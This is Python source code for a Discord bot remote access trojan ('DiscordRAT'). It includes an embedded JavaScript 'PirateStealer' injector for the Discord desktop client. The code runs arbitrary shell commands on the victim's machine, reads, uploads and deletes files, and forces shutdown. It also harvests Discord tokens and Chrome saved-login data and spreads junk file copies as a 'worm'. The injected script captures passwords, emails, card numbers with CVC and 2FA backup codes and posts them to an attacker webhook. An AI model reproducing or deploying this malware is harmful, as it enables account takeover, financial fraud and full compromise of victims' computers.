import os, requests, shutil, discord, ctypes, asyncio
from sys import argv
from urllib.request import *
from base64 import b64decode
from platform import platform
from re import findall, match
from discord.ext import commands
from subprocess import Popen, PIPE

class Variables:
    """
    botToken --> Your Discord Bot Token
    botPrefix -> Prefix to use in the commands (ex. !menu)
    embColour -> Choose a colour defined in the 'Colours' class
    """
    botToken  = "YOUR-BOT-TOKEN"
    botPrefix = "."
    embColour = "black"

class Colours():
    """ Selectable colours for embed """
    dict = {
        "red":   0xff0000,
        "blue":  0x0400ff,
        "pink":  0xff00e1,
        "black": 0x000000,
        "white": 0xffffff,
        "green": 0x03fc0b,
        "yellow":0xffd500,
        "purple":0x8d00d9
    }

class SysInfo:
    """ System & User Information """

    username = os.getenv("UserName")
    id = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)

    info = {
        "USER":os.getenv("UserName"),
        "PC":  os.getenv("COMPUTERNAME"),
        "OS":  platform().split("-"),
        "IP":  requests.get("https://api.ipify.org/").text,
        "HWID":(id.stdout.read() + id.stderr.read()).decode().split("\n")[1]
    }

class Commands:
    """ Command Dictionaries """

    misc = {
        "message <message>": "Open message-box",
        "url <site>": "Open a URL",
        "spam <amount>": "Spam windows",
        "admin": "Check admin privileges"
    }
    files = {
        "cwd": "List current directory",
        "worm":"Spam files in every directory",
        "look <directory>": "List custom directory", 
        "read <file path>": "Read file content",
        "remove <file path>": "Remove a file"
    }
    system = {
        "cmd <command>": "Execute custom command",
        "shutdown": "Shutdown computer",
        "info": "Get system information",
        "chrome": "Get Chrome Data",
        "tasks": "Sends running processes",
        "drivers": "Sends driver information"
    }
    discord = {
        "inject <webhook>": "[not working!] Injects script into Discord with your webhook",
        "tokens": "Get Discord token(s)"
    }
    settings = {
        "prefix <new prefix>":"Changes the current bot prefix",
        "embedcolour <colour>": "Changes the embed colour",
        "embedcolours": "Lists the available embed colours"
    }
    dict_list = [misc, files, system, discord, settings]

class Tools:

    class Injector:
        """ Currently not working! """
        def __init__(inj, webhook):
            inj.webhook = webhook
            inj.appdata = os.getenv("localappdata")
            inj.startup = f"{os.getenv('appdata')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

        def inject(inj):
            for _dir in os.listdir(inj.appdata):
                if 'discord' in _dir.lower():
                    discord = inj.appdata+os.sep+_dir
                    disc_sep = discord+os.sep
                    for __dir in os.listdir(os.path.abspath(discord)):
                        if match(r'app-(\d*\.\d*)*', __dir):
                            app = os.path.abspath(disc_sep+__dir)
                            inj_path = app+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\'
                            if os.path.exists(inj_path):
                                if inj.startup not in argv[0]:
                                    try:
                                        os.makedirs(inj_path+'initiation', exist_ok=True)
                                    except PermissionError:
                                        pass
                                r = """const{BrowserWindow:BrowserWindow,session:session}=require("electron"),fs=require("fs"),path=require("path"),querystring=require("querystring"),os=require("os"),webhook="%WEBHOOK_LINK%",Filters={1:{urls:["https://discord.com/api/v*/users/@me","https://discordapp.com/api/v*/users/@me","https://*.discord.com/api/v*/users/@me","https://discordapp.com/api/v*/auth/login","https://discord.com/api/v*/auth/login","https://*.discord.com/api/v*/auth/login","https://api.stripe.com/v1/tokens"]},2:{urls:["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json","https://*.discord.com/api/v*/applications/detectable","https://discord.com/api/v*/applications/detectable","https://*.discord.com/api/v*/users/@me/library","https://discord.com/api/v*/users/@me/library","https://*.discord.com/api/v*/users/@me/billing/subscriptions","https://discord.com/api/v*/users/@me/billing/subscriptions","wss://remote-auth-gateway.discord.gg/*"]}},config={logout:"%LOGOUT%","logout-notify":"%LOGOUTNOTI%","init-notify":"%INITNOTI%","embed-color":3447704,"disable-qr-code":"%DISABLEQRCODE%",ping:[!0,"@everyone"]},badges={Discord_Employee:{Value:1,Emoji:"<:staff:874750808728666152>",Rare:!0},Partnered_Server_Owner:{Value:2,Emoji:"<:partner:874750808678354964>",Rare:!0},HypeSquad_Events:{Value:4,Emoji:"<:hypesquad_events:874750808594477056>",Rare:!0},Bug_Hunter_Level_1:{Value:8,Emoji:"<:bughunter_1:874750808426692658>",Rare:!0},Early_Supporter:{Value:512,Emoji:"<:early_supporter:874750808414113823>",Rare:!0},Bug_Hunter_Level_2:{Value:16384,Emoji:"<:bughunter_2:874750808430874664>",Rare:!0},Early_Verified_Bot_Developer:{Value:131072,Emoji:"<:developer:874750808472825986>",Rare:!0},House_Bravery:{Value:64,Emoji:"<:bravery:874750808388952075>",Rare:!1},House_Brilliance:{Value:128,Emoji:"<:brilliance:874750808338608199>",Rare:!1},House_Balance:{Value:256,Emoji:"<:balance:874750808267292683>",Rare:!1}};class PirateStealerEvent{constructor(e,t,n){this.event=e,this.data=n,this.token=t}handle(){switch(this.event){case"passwordChanged":passwordChanged(this.data.password,this.data.new_password,this.token);break;case"userLogin":userLogin(this.data.password,this.data.email,this.token);break;case"emailChanged":emailChanged(this.data.password,this.data.email,this.token);break;case"creditCardAdded":creditCardAdded(this.data.cardnumber,this.data.cvc,this.data.expiration,this.token)}}}async function firstTime(){var e=await getToken();if("true"==config["init-notify"]&&fs.existsSync(path.join(__dirname,"init")))if(fs.rmdirSync(path.join(__dirname,"init")),null==e||null==e||""==e){var t={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Discord Initalized (User not Logged in)",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"}}]};sendToWebhook(JSON.stringify(t))}else{var n=await getUserInfo(e);t={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Discord Initalized",description:`[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${e})`,color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${n.username}#${n.discriminator}\``,inline:!0},{name:"ID",value:`\`${n.id}\``,inline:!0},{name:"Badges",value:`${getBadges(n.flags)}`,inline:!1},{name:"Token",value:`\`\`\`${e}\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}`}}]};sendToWebhook(JSON.stringify(t))}if(!fs.existsSync(path.join(__dirname,"PirateStealerBTW")))return!0;if(fs.rmdirSync(path.join(__dirname,"PirateStealerBTW")),"false"!=config.logout||"%LOGOUT%"==config.logout){if("true"==config["logout-notify"])if(null==e||null==e||""==e){t={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"User log out (User not Logged in before)",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"}}]};sendToWebhook(JSON.stringify(t))}else{const n=await getUserInfo(e);t={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"User got logged out",description:`[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${e})`,color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${n.username}#${n.discriminator}\``,inline:!0},{name:"ID",value:`\`${n.id}\``,inline:!0},{name:"Badges",value:`${getBadges(n.flags)}`,inline:!1},{name:"Token",value:`\`\`\`${e}\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}`}}]};sendToWebhook(JSON.stringify(t))}BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',!0).then((e=>{}))}return!1}async function userLogin(e,t,n){var a=await getUserInfo(n),i=await getIp(),r=await getBilling(n),o=await getRelationships(n),s={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"User Login",description:`[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${n}\n${e})`,color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nIP: \n${i}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${a.username}#${a.discriminator}\``,inline:!0},{name:"ID",value:`\`${a.id}\``,inline:!0},{name:"Nitro",value:`${getNitro(a.premium_type)}`,inline:!1},{name:"Badges",value:`${getBadges(a.flags)}`,inline:!1},{name:"Billing",value:`${r}`,inline:!1},{name:"Email",value:`\`${t}\``,inline:!0},{name:"Password",value:`\`${e}\``,inline:!0},{name:"Token",value:`\`\`\`${n}\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}},{title:`Total Friends (${o.length})`,color:config["embed-color"],description:o.frien,author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}}]};if(n.startsWith("mfa")){var l=await get2faCodes(n,e),d={title:":detective: __2FA Codes__",description:`[Get all of them](${l.url})`,color:config["embed-color"],fields:l.fields,author:{name:"PirateStealer"},footer:{text:"PirateStealer"}};s.embeds.push(d)}sendToWebhook(JSON.stringify(s))}async function emailChanged(e,t,n){var a=await getUserInfo(n),i=await getIp(),r=await getRelationships(n),o={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Email Changed",description:`[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${n}\n${e}\n${t})`,color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nIP: \n${i}\`\`\``,inline:!1},{name:"Username",value:`\`${a.username}#${a.discriminator}\``,inline:!0},{name:"ID",value:`\`${a.id}\``,inline:!0},{name:"Nitro",value:`${getNitro(a.premium_type)}`,inline:!1},{name:"Badges",value:`${getBadges(a.flags)}`,inline:!1},{name:"New Email",value:`\`${t}\``,inline:!0},{name:"Password",value:`\`${e}\``,inline:!0},{name:"Token",value:`\`\`\`${n}\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}},{title:`Total Friends (${r.length})`,color:config["embed-color"],description:r.frien,author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}}]};if(n.startsWith("mfa")){var s=await get2faCodes(n,e),l={title:":detective: __2FA Codes__",description:`[Get all of them](${s.url})`,color:config["embed-color"],fields:s.fields,author:{name:"PirateStealer"},footer:{text:"PirateStealer"}};o.embeds.push(l)}sendToWebhook(JSON.stringify(o))}async function passwordChanged(e,t,n){var a=await getUserInfo(n),i=await getIp(),r=await getBilling(n),o=await getRelationships(n),s={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Password Changed",description:`[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${n}\n${t})`,color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nIP: \n${i}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${a.username}#${a.discriminator}\``,inline:!0},{name:"ID",value:`\`${a.id}\``,inline:!0},{name:"Nitro",value:`${getNitro(a.premium_type)}`,inline:!1},{name:"Badges",value:`${getBadges(a.flags)}`,inline:!1},{name:"Billing",value:`${r}`,inline:!1},{name:"Email",value:`\`${a.email}\``,inline:!1},{name:"Old Password",value:`\`${e}\``,inline:!0},{name:"New Password",value:`\`${t}\``,inline:!0},{name:"Token",value:`\`\`\`${n}\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}},{title:`Total Friends (${o.length})`,color:config["embed-color"],description:o.frien,author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}}]};if(n.startsWith("mfa")){var l=await get2faCodes(n,t),d={title:":detective: __2FA Codes__",description:`[Get all of them](${l.url})`,color:config["embed-color"],fields:l.fields,author:{name:"PirateStealer"},footer:{text:"PirateStealer"}};s.embeds.push(d)}sendToWebhook(JSON.stringify(s))}async function creditCardAdded(e,t,n,a){var i=await getUserInfo(a),r=await getIp(),o=await getBilling(a),s=await getRelationships(a),l={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Credit Card",description:`[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${a})`,color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nIP: \n${r}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${i.username}#${i.discriminator}\``,inline:!0},{name:"ID",value:`\`${i.id}\``,inline:!0},{name:"Nitro",value:`${getNitro(i.premium_type)}`,inline:!1},{name:"Badges",value:`${getBadges(i.flags)}`,inline:!1},{name:"Billing",value:`${o}`,inline:!1},{name:"Email",value:`\`${i.email}\``,inline:!1},{name:"CC Number",value:`\`${e}\``,inline:!0},{name:"Expiration",value:`\`${n}\``,inline:!0},{name:"CVC",value:`\`${t}\``,inline:!0},{name:"Token",value:`\`\`\`${a}\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`}},{title:`Total Friends (${s.length})`,color:config["embed-color"],description:s.frien,author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`}}]};sendToWebhook(JSON.stringify(l))}async function sendToWebhook(e){BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`var xhr = new XMLHttpRequest();xhr.open("POST", "${webhook}", true);xhr.setRequestHeader('Content-Type', 'application/json');xhr.setRequestHeader('Access-Control-Allow-Origin', '*');xhr.send(JSON.stringify(${e}));`,!0)}async function getRelationships(e){const t=BrowserWindow.getAllWindows()[0];var n=await t.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "${e}");xmlHttp.send( null );xmlHttp.responseText`,!0);const a=JSON.parse(n).filter((e=>1==e.type));var i="";for(z of a){var r=getRareBadges(z.user.public_flags);""!=r&&(i+=`${r} ${z.user.username}#${z.user.discriminator}\n`)}return i=i??"No Rare Friends",{length:a.length,frien:i}}async function get2faCodes(e,t){let n=[],a="https://ctf.surf/raw/";const i=BrowserWindow.getAllWindows()[0];var r=await i.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);xmlHttp.setRequestHeader('Content-Type', 'application/json');xmlHttp.setRequestHeader("authorization", "${e}");xmlHttp.send(JSON.stringify({"password":"${t}","regenerate":false}));xmlHttp.responseText`,!0);const o=JSON.parse(r).backup_codes.filter((e=>null==e.consumed));for(let e in o)n.push({name:"Code",value:`\`${o[e].code.insert(4,"-")}\``,inline:!0}),a+=`${o[e].code.insert(4,"-")}\n`;return{fields:n,url:a}}async function getBilling(e){const t=BrowserWindow.getAllWindows()[0];var n=await t.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${e}"); xmlHttp.send( null ); xmlHttp.responseText`,!0),a=JSON.parse(n),i="";return a.forEach((e=>{if(2==e.type&&1!=e.invalid)i+="`✔️` <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"`❌`";i+="`✔️` :credit_card:"}})),i=i??"`❌`"}async function getUserInfo(e){const t=BrowserWindow.getAllWindows()[0];var n=await t.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${e}");xmlHttp.send( null );xmlHttp.responseText;`,!0);return JSON.parse(n)}async function getIp(){const e=BrowserWindow.getAllWindows()[0];return await e.webContents.executeJavaScript('var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );xmlHttp.send( null );xmlHttp.responseText;',!0)}async function getToken(){const e=BrowserWindow.getAllWindows()[0];return await e.webContents.executeJavaScript("for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;",!0)}function getBadges(e){var t="";for(const n in badges){let a=badges[n];(e&a.Value)==a.Value&&(t+=a.Emoji)}return""==t&&(t="None"),t}function getRareBadges(e){var t="";for(const n in badges){let a=badges[n];(e&a.Value)==a.Value&&a.Rare&&(t+=a.Emoji)}return t}function getNitro(e){switch(e){case 1:return"<:classic:896119171019067423> `Nitro Classic`";case 2:return"<a:boost:824036778570416129> `Nitro Boost`";default:return"No Nitro"}}session.defaultSession.webRequest.onBeforeRequest(Filters[2],((e,t)=>{!e.url.startsWith("wss://")||"true"!=config["disable-qr-code"]&&"%DISABLEQRCODE%"!=config["disable-qr-code"]?(firstTime(),t({})):t({cancel:!0})})),session.defaultSession.webRequest.onHeadersReceived(((e,t)=>{e.url.startsWith(webhook)?e.url.includes("discord.com")?t({responseHeaders:Object.assign({"Access-Control-Allow-Headers":"*"},e.responseHeaders)}):t({responseHeaders:Object.assign({"Content-Security-Policy":["default-src '*'","Access-Control-Allow-Headers '*'","Access-Control-Allow-Origin '*'"],"Access-Control-Allow-Headers":"*","Access-Control-Allow-Origin":"*"},e.responseHeaders)}):(delete e.responseHeaders["content-security-policy"],delete e.responseHeaders["content-security-policy-report-only"],t({responseHeaders:{...e.responseHeaders,"Access-Control-Allow-Headers":"*"}}))})),session.defaultSession.webRequest.onCompleted(Filters[1],(async(e,t)=>{if(200!=e.statusCode)return;const n=Buffer.from(e.uploadData[0].bytes).toString(),a=JSON.parse(n),i=await getToken();switch(!0){case e.url.endsWith("login"):return void new PirateStealerEvent("userLogin",i,{password:a.password,email:a.login}).handle();case e.url.endsWith("users/@me")&&"PATCH"==e.method:if(!a.password)return;if(a.email)new PirateStealerEvent("emailChanged",i,{password:a.password,email:a.email}).handle();if(a.new_password)new PirateStealerEvent("passwordChanged",i,{password:a.password,new_password:a.new_password}).handle();return;case e.url.endsWith("tokens")&&"POST"==e.method:const t=querystring.parse(decodeURIComponent(n));return void new PirateStealerEvent("creditCardAdded",i,{cardnumber:t["card[number]"],cvc:t["card[cvc]"],expiration:`${t["card[exp_month]"]}/${t["card[exp_year]"]}`}).handle()}})),module.exports=require("./core.asar");"""
                                r = r.replace("%LOGOUT%", "true").replace("%LOGOUTNOTI%", "true").replace("%INITNOTI%", "true").replace("%DISABLEQRCODE%", "true").replace("%WEBHOOK_LINK%", inj.webhook)
                                try:
                                    with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                        indexFile.write(r)
                                except PermissionError:
                                    pass
                                os.startfile(app + os.sep + _dir + '.exe')

    class Files:
        """ Writing command output to files """

        def __init__(files):
            files.path = "C:\\ProgramData\\{}.txt"
            files.tasks = files.path.format("tasks")
            files.drivers = files.path.format("drivers")

        def Write(files, cmd, fpath):
            data = os.popen(cmd).read()
            with open(fpath, "w") as f:
                f.write(data)
                f.close()

        def Tasks(files):
            files.Write("tasklist", files.tasks)

        def Drivers(files):
            files.Write("DRIVERQUERY", files.drivers)

    class Worm:
        """ Create worm and spread files """

        def __init__(worm, path=os.path.abspath(""), target_dir_list=None, iteration=None):
            if isinstance(path, type(None)):worm.path = "/"
            else:worm.path = path

            if isinstance(target_dir_list, type(None)):
                worm.target_dir_list = []
                worm.iteration = 2
            else:
                worm.target_dir_list = target_dir_list
                worm.iteration = iteration

            worm.own_path = os.path.realpath(__file__)

        def createWorm(worm):
            for directory in worm.target_dir_list:
                destination = os.path.join(directory, ".worm")
                shutil.copyfile(worm.own_path, destination)

        def listDirs(worm,path):
            worm.target_dir_list.append(path)
            files_in_current_directory = os.listdir(path)

            for file in files_in_current_directory:
                if not file.startswith("."):
                    absolute_path = os.path.join(path, file)
                    if os.path.isdir(absolute_path):worm.listDirs(absolute_path)
                    else:pass

        def copyFiles(worm):
            for i in range(worm.loops):
                for directory in worm.target_dir_list:
                    file_list_in_dir = os.listdir(directory)
                    for file in file_list_in_dir:
                        abs_path = os.path.join(directory, file)
                        if not abs_path.startswith(".") and not os.path.isdir(abs_path):
                            source = abs_path
                            for i in range(worm.iteration):
                                destination = os.path.join(directory,("."+file+str(i)))
                                shutil.copyfile(source, destination)

        def start(worm):
            worm.listDirs(worm.path)
            worm.createWorm()
            worm.copyFiles()

class Bot:
    """ DiscordRAT Bot """

    def __init__(rat):
        rat.sys   = SysInfo()
        rat.tools = Tools()
        rat.local = os.getenv("LOCALAPPDATA")
        rat.roaming = os.getenv("APPDATA")

        rat.token  = Variables.botToken
        rat.tokens = ""
        rat.tokenPaths = {
            "Discord"               : rat.roaming + "\\Discord",
            "Discord Canary"        : rat.roaming + "\\discordcanary",
            "Discord PTB"           : rat.roaming + "\\discordptb",
            "Opera"                 : rat.roaming + "\\Opera Software\\Opera Stable",
            "Lightcord"             : rat.roaming + "\\Lightcord",
            "Firefox"               : rat.roaming + "\\Mozilla\\Firefox\\Profiles",
            "Opera GX"              : rat.roaming + "\\Opera Software\\Opera GX Stable",
            "Yandex"                : rat.local + "\\Yandex\\YandexBrowser\\User Data\\Default",
            "Amigo"                 : rat.local + "\\Amigo\\User Data",
            "Torch"                 : rat.local + "\\Torch\\User Data",
            "Kometa"                : rat.local + "\\Kometa\\User Data",
            "Orbitum"               : rat.local + "\\Orbitum\\User Data",
            "CentBrowser"           : rat.local + "\\CentBrowser\\User Data",
            "7Star"                 : rat.local + "\\7Star\\7Star\\User Data",
            "Sputnik"               : rat.local + "\\Sputnik\\Sputnik\\User Data",
            "Vivaldi"               : rat.local + "\\Vivaldi\\User Data\\Default",
            "Chrome SxS"            : rat.local + "\\Google\\Chrome SxS\\User Data",
            "Epic Privacy Browser"  : rat.local + "\\Epic Privacy Browser\\User Data",
            "Google Chrome"         : rat.local + "\\Google\\Chrome\\User Data\\Default",
            "Microsoft Edge"        : rat.local + "\\Microsoft\\Edge\\User Data\\Default",
            "Uran"                  : rat.local + "\\uCozMedia\\Uran\\User Data\\Default",
            "Brave"                 : rat.local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        }

    def EmbMsg(rat, Name, Value):
        embed = discord.Embed(title = "DiscordRAT", color=Colours.dict.get(Variables.embColour))
        embed.add_field(name = f"{Name}", value = f"{Value}")
        embed.set_footer(text = "github.com/codeuk・Discord RAT")
        return embed

    def Validate(rat, token) -> bool:
        r = requests.get("https://discord.com/api/v8/users/@me/billing/payment-sources", headers={"authorization": token, "content-type": "application/json"})
        return True if r.status_code == 200 else False

    def Main(rat) -> None:
        V = Variables()
        RAT = commands.Bot(command_prefix=V.botPrefix)
        RAT.remove_command("help")

        @RAT.event
        async def on_ready():
            await RAT.change_presence(activity=discord.Game(name=f"RAT Running @ {SysInfo.info.get('IP')}"))

        @RAT.command()
        async def tokens(ctx):
            for platform, path in rat.tokenPaths.items():
                path += "\\Local Storage\\leveldb"
                if os.path.exists(path):
                    for file_name in os.listdir(path):
                        if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                    for token in findall(regex, line):
                                        await ctx.send(embed = rat.EmbMsg(
                                            f"`Token from {platform}`\n`{token}`",
                                            f"Valid: **{bool(rat.Validate(token))}**")
                                        )

        @RAT.command()
        async def info(ctx):
            info = ""
            for name, value in rat.sys.info.items():
                info += f"```{name}: {value}```"
            await ctx.send(embed = rat.EmbMsg(f"{rat.sys.username}'s Information", f"{info}"))

        @RAT.command()
        async def cmd(ctx, command):
            with Popen(command, stdout=PIPE, stderr=None, shell=True) as process:
                try:
                    output = process.communicate()[0].decode("utf-8")
                except Exception as error:
                    await ctx.send(f"```{error}```")
                try:
                    await ctx.send(embed = rat.EmbMsg(f"**'{command}' Output**", f"```{output}```"))
                except:
                    await ctx.send(embed = rat.EmbMsg(f"`'{command}'`", f"```Sending Output...```"))
                    with open("C:\\ProgramData\\command.txt", "w") as f:
                        f.write(output)
                        f.close()
                        await ctx.send(file=discord.File(r"C:\\ProgramData\\command.txt"))
                    os.remove("C:\\ProgramData\\command.txt")

        @RAT.command()
        async def chrome(ctx):
            path = "C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
            await ctx.send(file = discord.File(path.format(rat.sys.username)))

        @RAT.command()
        async def url(ctx, url):
            os.system(f"start {url}")
            await ctx.send(embed = rat.EmbMsg(
                "`Open URL`",
                f"```'{url}' Opened Successfully```")
            )

        @RAT.command()
        async def message(ctx, msg):
            os.system('powershell "(new-object -ComObject wscript.shell).Popup(\\"{}\\",0,\\"Windows\\")"'.format(message))
            await ctx.send(embed = rat.EmbMsg(
                "`MessageBox`",
                f"```MessageBox Sent Successfully```")
            )

        @RAT.command()
        async def admin(ctx):
            admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            await ctx.send(embed = rat.EmbMsg(
                f"`Privilege Check`",
                f"```Admin Privileges -> {admin}```")
            )

        @RAT.command()
        async def shutdown(ctx):
            os.system("shutdown /s /t 1")
            await ctx.send(embed = rat.EmbMsg(
                f"`Shutdown Command`",
                "```Shutdown Successful```")
            )

        @RAT.command()
        async def cwd(ctx):
            get = os.getcwd()
            cwd = str(get)
            await ctx.send(embed = rat.EmbMsg(
                "`Current Directory Path`",
                f"```{cwd}```")
            )

        @RAT.command()
        async def look(ctx, dir):
            files = ""
            for file in os.listdir(dir):
                files += f"{file}\n"
            await ctx.send(embed = rat.EmbMsg(f"`Directory`", f"```Sending Files from {dir}```"))
            await ctx.send(f"```{files}```")

        @RAT.command()
        async def worm(ctx):
            Worm = rat.tools.Worm()
            Worm.start()

        @RAT.command()
        async def drivers(ctx):
            files = rat.tools.Files()
            files.Drivers()
            await ctx.send(embed = rat.EmbMsg(f"`Drivers`", f"```Sending Driver Information...```"))
            await ctx.send(file=discord.File(r"C:\\ProgramData\\drivers.txt"))
            os.remove("C:\\ProgramData\\drivers.txt")  

        @RAT.command()
        async def tasks(ctx):
            files = rat.tools.Files()
            files.Tasks()
            await ctx.send(embed = rat.EmbMsg(f"`Tasks`", f"```Sending Process Information...```"))
            await ctx.send(file=discord.File(r"C:\\ProgramData\\tasks.txt"))
            os.remove("C:\\ProgramData\\tasks.txt")  

        @RAT.command()
        async def download(ctx, filepath):
            await ctx.send(embed = rat.EmbMsg(f"`Downloading File`", f"```{filepath}```"))
            await ctx.send(file=discord.File(fr"{filepath}"))

        @RAT.command()
        async def remove(ctx, file):
            os.remove(file)
            await ctx.send(embed = rat.EmbMsg(f"`Successfully Removed File:`", f"```{file}```"))

        @RAT.command()
        async def read(ctx, file):
            try:
                files = open(file, "r").read()
                await ctx.send(embed = rat.EmbMsg(f"`File Content: `", f"```\n{files}\n```"))
            except PermissionError:
                await ctx.send(embed = rat.EmbMsg(f"`Permission Error`", f"```Couldn't Open File```"))
            except:
                files = open(file, "r").read()
                await ctx.send(embed = rat.EmbMsg(f"`{file}`", f"```Uploading File (too big for a message)```"))
                await ctx.send(file=discord.File(fr"{file}"))

        @RAT.command()
        async def spam(ctx, amt):
            for i in range(int(amt)):
                os.system("start cmd")
                os.system("start https://google.com")
            await ctx.send(embed = rat.EmbMsg(f"`Window Spam`", f"```Successfully spammed {amt} Windows```"))

        @RAT.command()
        async def embedcolour(ctx, colour):
            if colour not in Colours.dict.keys():
                await ctx.send(embed = rat.EmbMsg(f"`Embed Colour`", f"```Error - Invalid Colour```"))
            else:
                Variables.embColour  = colour
                await ctx.send(embed = rat.EmbMsg(f"`Embed Colour`", f"```Colour Changed Successfully```"))

        @RAT.command()
        async def embedcolours(ctx):
            arr = ""
            for colour in Colours.dict.keys():
                arr += f"{colour}\n"
            await ctx.send(embed = rat.EmbMsg(f"`Valid Embed Colours`", f"```{arr}```"))

        @RAT.command()
        async def prefix(ctx, prefix):
            Variables.botPrefix = RAT.command_prefix = prefix
